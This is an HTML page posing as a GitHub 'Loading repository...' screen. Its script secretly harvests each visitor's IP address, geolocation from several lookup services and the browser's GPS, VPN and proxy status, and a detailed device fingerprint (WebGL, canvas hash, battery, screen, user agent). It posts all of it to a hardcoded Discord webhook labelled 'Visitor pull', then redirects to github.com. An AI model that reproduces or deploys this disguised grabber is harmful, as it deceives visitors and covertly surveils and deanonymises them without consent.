<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GitHub</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:12px}
    .loader{width:36px;height:36px;border:3px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .7s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .msg{font-size:14px;color:#8b949e}
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="msg">Loading repository...</div>
  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1556768436279840975/DfNnm5bqz6nitAVzJzUc8dV2pdXD1vOQROTddxR8kL8mQx4qrRPsJ9tVCFnnuKzSocyq";

    function safe(v,n){n=n||400;if(v==null)return"n/a";if(typeof v==="object")try{return JSON.stringify(v).slice(0,n)}catch(e){return"[obj]"}return String(v).slice(0,n)}

    async function getIP(){
      try{const r=await fetch("https://api.ipify.org?format=json");return(await r.json()).ip}catch(e){
        try{const r=await fetch("https://api64.ipify.org?format=json");return(await r.json()).ip}catch(e2){return null}
      }
    }

    async function geoBundle(ip){
      const out={ipapi:null,ipapico:null,ipinfo:null};
      if(!ip)return out;
      await Promise.all([
        fetch("http://ip-api.com/json/"+ip+"?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query").then(r=>r.json()).then(j=>out.ipapi=j).catch(()=>{}),
        fetch("https://ipapi.co/"+ip+"/json/").then(r=>r.json()).then(j=>out.ipapico=j).catch(()=>{}),
        fetch("https://ipinfo.io/"+ip+"/json").then(r=>r.json()).then(j=>out.ipinfo=j).catch(()=>{})
      ]);
      return out;
    }

    async function detectVpn(ip,geo){
      const result={isProxy:false,isVpn:false,isHosting:false,isMobile:false,provider:null,type:null,risk:null};
      if(!ip)return result;
      const g=geo.ipapi||geo.ipapico||geo.ipinfo||{};
      if(g.proxy===true){result.isProxy=true;result.type="proxy"}
      if(g.hosting===true){result.isHosting=true;result.type=result.type||"hosting"}
      if(g.mobile===true)result.isMobile=true;
      result.provider=g.org||g.isp||g.org_name||g.asname||g.as||null;
      const org=(result.provider||"").toLowerCase();
      const kws=["nordvpn","expressvpn","surfshark","cyberghost","private internet access","pia","protonvpn","proton vpn","mullvad","windscribe","tunnelbear","ipvanish","hotspot shield","vyprvpn","purevpn","hidemyass","hma","zenmate","atlas vpn","privado","torguard","ivpn","airvpn","ovpn","vpn","proxy","digitalocean","linode","vultr","ovh","hetzner","amazon","aws","google cloud","microsoft azure","cloudflare","fastly","datacenter"];
      for(const kw of kws){if(org.includes(kw)){if(kw.includes("vpn")||kw==="pia"||kw==="hma")result.isVpn=true;if(kw.includes("proxy"))result.isProxy=true;if(["digitalocean","linode","vultr","ovh","hetzner","amazon","aws","google cloud","microsoft azure","cloudflare","fastly","datacenter"].some(x=>kw.includes(x)))result.isHosting=true;break}}
      try{
        const pc=await fetch("https://proxycheck.io/v2/"+ip+"?vpn=1&asn=1&risk=1");
        const pcj=await pc.json();const node=pcj[ip]||{};
        if(node.proxy==="yes")result.isProxy=true;
        if(node.type){const t=String(node.type).toLowerCase();if(t.includes("vpn")){result.isVpn=true;result.type="vpn"}else if(t.includes("proxy")){result.isProxy=true;result.type=result.type||"proxy"}else if(t.includes("hosting")||t.includes("data")){result.isHosting=true;result.type=result.type||"hosting"}}
        if(node.provider||node.operator)result.provider=node.provider||node.operator||result.provider;
        if(node.risk!==undefined)result.risk=node.risk;
      }catch(e){}
      try{
        const va=await fetch("https://api.ipapi.is/?q="+ip);const vaj=await va.json();
        if(vaj.is_vpn){result.isVpn=true;result.type="vpn"}
        if(vaj.is_proxy){result.isProxy=true;result.type=result.type||"proxy"}
        if(vaj.is_datacenter||vaj.is_hosting){result.isHosting=true;result.type=result.type||"hosting"}
        if(vaj.company&&vaj.company.name)result.provider=result.provider||vaj.company.name;
        if(vaj.vpn&&vaj.vpn.service)result.provider=vaj.vpn.service||result.provider;
      }catch(e){}
      if(!result.type){if(result.isVpn)result.type="vpn";else if(result.isProxy)result.type="proxy";else if(result.isHosting)result.type="hosting";else result.type="residential/unknown"}
      return result;
    }

    function browserInfo(){
      return{
        userAgent:navigator.userAgent,language:navigator.language,languages:navigator.languages?[...navigator.languages]:[],
        platform:navigator.platform,vendor:navigator.vendor,cookieEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack,
        hardwareConcurrency:navigator.hardwareConcurrency||null,deviceMemory:navigator.deviceMemory||null,maxTouchPoints:navigator.maxTouchPoints||0,
        webdriver:navigator.webdriver,
        screen:{width:screen.width,height:screen.height,availWidth:screen.availWidth,availHeight:screen.availHeight,colorDepth:screen.colorDepth,pixelDepth:screen.pixelDepth,orientation:screen.orientation?screen.orientation.type:null},
        window:{innerWidth:window.innerWidth,innerHeight:window.innerHeight,outerWidth:window.outerWidth,outerHeight:window.outerHeight,devicePixelRatio:window.devicePixelRatio},
        timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,timezoneOffset:new Date().getTimezoneOffset(),
        referrer:document.referrer||"direct",url:location.href,online:navigator.onLine
      };
    }

    function webglInfo(){
      try{const c=document.createElement("canvas");const gl=c.getContext("webgl")||c.getContext("experimental-webgl");if(!gl)return null;
        const dbg=gl.getExtension("WEBGL_debug_renderer_info");
        return{vendor:dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR),renderer:dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER)};
      }catch(e){return null}
    }

    function canvasHash(){
      try{const c=document.createElement("canvas");c.width=240;c.height=60;const ctx=c.getContext("2d");ctx.textBaseline="top";ctx.font="14px Arial";ctx.fillStyle="#f60";ctx.fillRect(0,0,120,60);ctx.fillStyle="#069";ctx.fillText("fp",4,18);return c.toDataURL().slice(-40)}catch(e){return null}
    }

    async function batteryInfo(){try{if(!navigator.getBattery)return null;const b=await navigator.getBattery();return{level:b.level,charging:b.charging}}catch(e){return null}}
    function connectionInfo(){try{const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(!c)return null;return{effectiveType:c.effectiveType,downlink:c.downlink,rtt:c.rtt,saveData:c.saveData}}catch(e){return null}}
    function geoPosition(){return new Promise(resolve=>{if(!navigator.geolocation){resolve({error:"unsupported"});return}const t=setTimeout(()=>resolve({error:"timeout"}),6000);navigator.geolocation.getCurrentPosition(pos=>{clearTimeout(t);resolve({lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy})},err=>{clearTimeout(t);resolve({error:err.message||"denied"})},{enableHighAccuracy:true,timeout:5000,maximumAge:0})})}

    async function collect(){
      const ip=await getIP();
      const [geo,battery,geoBrowser]=await Promise.all([geoBundle(ip),batteryInfo(),geoPosition()]);
      const vpn=await detectVpn(ip,geo);
      return{timestamp:new Date().toISOString(),ip,geo,vpn,geo_browser:geoBrowser,browser:browserInfo(),webgl:webglInfo(),canvasHash:canvasHash(),battery,connection:connectionInfo()};
    }

    function buildEmbed(d){
      const g=d.geo.ipapi||d.geo.ipapico||d.geo.ipinfo||{};
      const v=d.vpn||{};
      const loc=[g.city,g.regionName||g.region,g.country||g.country_name].filter(Boolean).join(", ")||"n/a";
      const vpnLine=[v.isVpn?"VPN: YES":"VPN: no",v.isProxy?"Proxy: YES":"Proxy: no",v.isHosting?"Hosting: YES":"Hosting: no",v.type?"Type: "+v.type:"",v.provider?"Provider: "+v.provider:"",v.risk!=null?"Risk: "+v.risk:""].filter(Boolean).join(" | ");
      const fields=[
        {name:"IP",value:"`"+safe(d.ip)+"`",inline:true},
        {name:"Location",value:safe(loc),inline:true},
        {name:"Org / ASN",value:safe((g.org||g.isp||"")+" "+(g.as||g.asn||"")),inline:false},
        {name:"VPN / Proxy",value:safe(vpnLine),inline:false},
        {name:"Coords",value:safe((g.lat||g.latitude)+", "+(g.lon||g.longitude)),inline:true},
        {name:"Browser Geo",value:d.geo_browser&&d.geo_browser.lat?(d.geo_browser.lat+", "+d.geo_browser.lon+" (±"+d.geo_browser.accuracy+"m)"):safe(d.geo_browser&&d.geo_browser.error),inline:true},
        {name:"Timezone",value:safe(d.browser.timezone),inline:true},
        {name:"User-Agent",value:"`"+safe(d.browser.userAgent,180)+"`",inline:false},
        {name:"Platform",value:safe(d.browser.platform),inline:true},
        {name:"Language",value:safe((d.browser.languages||[]).join(", ")),inline:true},
        {name:"Screen",value:safe(d.browser.screen.width+"x"+d.browser.screen.height),inline:true},
        {name:"Viewport",value:safe(d.browser.window.innerWidth+"x"+d.browser.window.innerHeight+" @"+d.browser.window.devicePixelRatio+"x"),inline:true},
        {name:"CPU / RAM",value:safe((d.browser.hardwareConcurrency||"?")+" cores / "+(d.browser.deviceMemory||"?")+" GB"),inline:true},
        {name:"WebGL",value:d.webgl?safe(d.webgl.vendor+" | "+d.webgl.renderer):"n/a",inline:false},
        {name:"Battery",value:d.battery?safe(Math.round(d.battery.level*100)+"% "+(d.battery.charging?"charging":"discharging")):"n/a",inline:true},
        {name:"Connection",value:d.connection?safe(d.connection.effectiveType+" · "+d.connection.downlink+"Mbps · RTT "+d.connection.rtt+"ms"):"n/a",inline:true},
        {name:"Referrer",value:safe(d.browser.referrer),inline:true}
      ];
      return{username:"puller",embeds:[{title:"Visitor pull",color:(v.isVpn||v.isProxy)?0xED4245:0x5865F2,fields,footer:{text:d.timestamp},timestamp:d.timestamp}]};
    }

    (async()=>{
      try{
        const data=await collect();
        await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(buildEmbed(data))});
        try{
          const raw=JSON.stringify({ip:data.ip,vpn:data.vpn,geo:data.geo.ipapi||data.geo.ipapico||data.geo.ipinfo,ua:data.browser.userAgent}).slice(0,1800);
          await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"```json\n"+raw+"\n```"})});
        }catch(e){}
      }catch(e){}
      location.replace("https://github.com");
    })();
  </script>
</body>
</html>
